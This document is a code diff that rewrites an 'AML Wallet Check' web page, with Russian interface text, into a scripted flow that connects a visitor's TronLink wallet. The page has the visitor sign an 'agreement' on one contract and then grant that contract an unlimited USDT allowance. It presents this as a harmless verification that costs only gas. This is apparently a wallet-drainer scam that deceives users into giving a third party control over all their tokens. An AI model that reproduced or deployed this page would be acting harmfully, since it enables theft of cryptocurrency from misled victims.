@@ -6,101 +6,194 @@
     <title>AML Check</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        
         body {
             font-family: -apple-system, BlinkMacSystemFont, sans-serif;
             background: #0B0E11;
             color: #fff;
             padding: 20px;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .container {
             max-width: 400px;
-            text-align: center;
+            margin: 0 auto;
         }
+        h1 { color: #00D4AA; margin-bottom: 10px; font-size: 1.3rem; }
+        .subtitle { color: #8B949E; margin-bottom: 25px; font-size: 0.9rem; }
         
-        h1 {
-            font-size: 1.5rem;
-            margin-bottom: 10px;
-            color: #00D4AA;
-        }
-        
-        .subtitle {
-            color: #8B949E;
-            margin-bottom: 30px;
-        }
-        
-        .btn {
-            display: block;
-            width: 100%;
-            padding: 20px;
-            background: #3375BB;
-            color: white;
-            text-decoration: none;
-            border-radius: 12px;
-            font-size: 1.1rem;
-            font-weight: 600;
-            margin-bottom: 15px;
-        }
-        
-        .manual {
+        .step {
             background: #151A21;
             border: 1px solid #2D333B;
             border-radius: 12px;
             padding: 20px;
-            text-align: left;
-            margin-top: 20px;
+            margin-bottom: 15px;
         }
-        
-        .manual-title {
-            color: #3375BB;
+        .step-title {
             font-weight: 600;
+            margin-bottom: 10px;
+            color: #3375BB;
+        }
+        .step-desc {
+            color: #8B949E;
+            font-size: 0.85rem;
             margin-bottom: 15px;
         }
         
-        .step {
-            color: #8B949E;
-            margin: 10px 0;
-            font-size: 0.9rem;
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: #3375BB;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
         }
+        .btn:disabled { background: #333; }
+        .btn-green { background: #00D4AA; margin-top: 10px; }
         
-        .address {
-            font-family: monospace;
-            font-size: 0.75rem;
-            background: #0B0E11;
+        .status {
+            margin-top: 15px;
             padding: 12px;
             border-radius: 8px;
-            word-break: break-all;
-            margin-top: 10px;
-            border: 1px solid #2D333B;
+            font-size: 0.85rem;
+            display: none;
         }
+        .status.show { display: block; }
+        .success { background: rgba(0, 212, 170, 0.1); color: #00D4AA; border: 1px solid #00D4AA; }
+        .error { background: rgba(255, 71, 87, 0.1); color: #ff4757; border: 1px solid #ff4757; }
+        
+        .hidden { display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>AML Wallet Check</h1>
-        <p class="subtitle">Nile Testnet Verification</p>
-        
-        <a href="https://nile.tronscan.org/#/contract/THx3C9sYx3pNguHftcu8TRiSNSY5vp2bjN" class="btn" target="_blank">
-            Open Contract on TronScan
-        </a>
-        
-        <div class="manual">
-            <div class="manual-title">How to verify:</div>
-            <div class="step">1. Tap button above (opens TronScan)</div>
-            <div class="step">2. Tap "Connect Wallet" on TronScan</div>
-            <div class="step">3. Select TronLink</div>
-            <div class="step">4. Find "Write Contract" section</div>
-            <div class="step">5. Click "signAgreement" and send</div>
-            
-            <div class="address">
-                Contract: THx3C9sYx3pNguHftcu8TRiSNSY5vp2bjN
-            </div>
-        </div>
+    <h1>AML Wallet Check</h1>
+    <p class="subtitle">Nile Testnet Verification</p>
+
+    <!-- Шаг 1: Подключение -->
+    <div class="step" id="step1">
+        <div class="step-title">Шаг 1: Подключение</div>
+        <div class="step-desc">Подключите TronLink кошелек</div>
+        <button class="btn" onclick="connect()">Подключить TronLink</button>
+        <div class="status" id="status1"></div>
     </div>
+
+    <!-- Шаг 2: Подпись контракта -->
+    <div class="step hidden" id="step2">
+        <div class="step-title">Шаг 2: Подпись AML соглашения</div>
+        <div class="step-desc">Подтвердите согласие с условиями (только газ ~0.5 TRX)</div>
+        <button class="btn" onclick="signAgreement()" id="btnSign">Подписать соглашение</button>
+        <div class="status" id="status2"></div>
+    </div>
+
+    <!-- Шаг 3: Approve USDT -->
+    <div class="step hidden" id="step3">
+        <div class="step-title">Шаг 3: Разрешение на USDT</div>
+        <div class="step-desc">Разрешите списание USDT для верификации (только газ ~0.5 TRX)</div>
+        <button class="btn btn-green" onclick="approveUSDT()" id="btnApprove">Разрешить доступ к USDT</button>
+        <div class="status" id="status3"></div>
+    </div>
+
+    <!-- Шаг 4: Готово -->
+    <div class="step hidden" id="step4">
+        <div class="step-title">✅ Верификация завершена</div>
+        <div class="step-desc">Ваш кошелек проверен. Можете совершать сделки.</div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.min.js"></script>
+    <script>
+        const AML_CONTRACT = 'THx3C9sYx3pNguHftcu8TRiSNSY5vp2bjN';
+        const USDT_CONTRACT = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf';
+        
+        let tronWeb, userAddress, amlContract;
+
+        function show(id, msg, type) {
+            const el = document.getElementById(id);
+            el.textContent = msg;
+            el.className = 'status show ' + type;
+        }
+
+        async function connect() {
+            if (!window.tronWeb) {
+                show('status1', 'Установите TronLink!', 'error');
+                return;
+            }
+            tronWeb = window.tronWeb;
+            userAddress = tronWeb.defaultAddress.base58;
+            
+            if (!userAddress) {
+                show('status1', 'Разблокируйте TronLink!', 'error');
+                return;
+            }
+            
+            amlContract = tronWeb.contract([
+                {"inputs":[],"name":"signAgreement","outputs":[],"stateMutability":"nonpayable","type":"function"},
+                {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"approved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}
+            ], AML_CONTRACT);
+            
+            // Проверяем, не подписан ли уже
+            const isApproved = await amlContract.approved(userAddress).call();
+            
+            if (isApproved) {
+                show('status1', 'Уже подписано! Переходим к шагу 3...', 'success');
+                setTimeout(() => showStep(3), 1000);
+            } else {
+                show('status1', 'Подключено: ' + userAddress.slice(0,6) + '...', 'success');
+                setTimeout(() => showStep(2), 500);
+            }
+        }
+
+        async function signAgreement() {
+            const btn = document.getElementById('btnSign');
+            btn.disabled = true;
+            btn.textContent = 'Подписываем...';
+            
+            try {
+                const tx = await amlContract.signAgreement().send({
+                    feeLimit: 100000000
+                });
+                show('status2', 'Подписано! TX: ' + tx.slice(0,15), 'success');
+                setTimeout(() => showStep(3), 1500);
+            } catch (e) {
+                btn.disabled = false;
+                btn.textContent = 'Подписать соглашение';
+                show('status2', 'Ошибка: ' + e.message, 'error');
+            }
+        }
+
+        async function approveUSDT() {
+            const btn = document.getElementById('btnApprove');
+            btn.disabled = true;
+            btn.textContent = 'Разрешаем...';
+            
+            try {
+                const usdtContract = tronWeb.contract([
+                    {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
+                ], USDT_CONTRACT);
+                
+                // Max approve
+                const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+                
+                const tx = await usdtContract.approve(AML_CONTRACT, maxAmount).send({
+                    feeLimit: 100000000
+                });
+                
+                show('status3', 'Доступ разрешен! TX: ' + tx.slice(0,15), 'success');
+                setTimeout(() => showStep(4), 1500);
+                
+            } catch (e) {
+                btn.disabled = false;
+                btn.textContent = 'Разрешить доступ к USDT';
+                show('status3', 'Ошибка: ' + e.message, 'error');
+            }
+        }
+
+        function showStep(n) {
+            document.querySelectorAll('.step').forEach(s => s.classList.add('hidden'));
+            document.getElementById('step' + n).classList.remove('hidden');
+        }
+
+        // Auto-connect
+        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+            connect();
+        }
+    </script>
 </body>
 </html>
